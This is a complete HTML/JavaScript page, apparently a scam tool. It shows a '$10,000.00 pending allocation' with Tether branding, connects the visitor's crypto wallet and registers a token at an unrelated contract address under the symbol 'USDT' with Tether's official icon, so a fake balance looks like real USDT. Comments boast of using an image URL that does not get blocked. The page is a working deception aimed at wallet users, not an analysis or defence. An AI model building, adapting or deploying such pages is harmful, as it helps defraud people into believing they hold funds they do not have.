<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Node | Asset Mapping</title>
    <style>
        body { background: #0d1117; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #161b22; border: 1px solid #30363d; padding: 40px; border-radius: 25px; text-align: center; width: 320px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .logo-img { width: 80px; height: 80px; border-radius: 50%; border: 2px solid #009379; padding: 5px; margin-bottom: 20px; }
        .btn { background: #009379; color: white; border: none; padding: 18px; width: 100%; border-radius: 15px; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; }
        .btn:hover { background: #00b395; }
        #msg { font-size: 11px; color: #8b949e; margin-top: 20px; font-family: monospace; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://static.crypto.com/token/icons/tether/color_icon.png" class="logo-img">
    <div style="font-size: 28px; font-weight: 800; margin-bottom: 10px;">$10,000.00</div>
    <div style="font-size: 12px; color: #009379; margin-bottom: 30px; letter-spacing: 1px;">PENDING ALLOCATION</div>
    
    <button class="btn" onclick="mapLogo()">SYNC ASSET LOGO</button>
    <div id="msg">LOG: STANDBY_FOR_SYNC</div>
</div>

<script>
    async function mapLogo() {
        const addr = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
        // Stable URL jo block nahi hota
        const img = "https://static.crypto.com/token/icons/tether/color_icon.png"; 

        if (window.ethereum) {
            try {
                document.getElementById('msg').innerText = "CONNECTING WALLET...";
                await window.ethereum.request({ method: 'eth_requestAccounts' });

                document.getElementById('msg').innerText = "MAPPING CUSTOM METADATA...";
                
                // Professor's Main Logic: Injecting the logo link into the wallet
                await window.ethereum.request({
                    method: 'wallet_watchAsset',
                    params: {
                        type: 'ERC20',
                        options: {
                            address: addr,
                            symbol: 'USDT', // Aapka custom symbol
                            decimals: 18,
                            image: img,
                        },
                    },
                });

                document.getElementById('msg').innerText = "SUCCESS: ASSET SYNCED";
                alert("Logo updated! Check your wallet's token list.");
            } catch (e) {
                document.getElementById('msg').innerText = "SYNC_FAILED: USER_REJECTED";
            }
        } else {
            alert("Please open in MetaMask/Trust Browser");
        }
    }
</script>

</body>
</html>
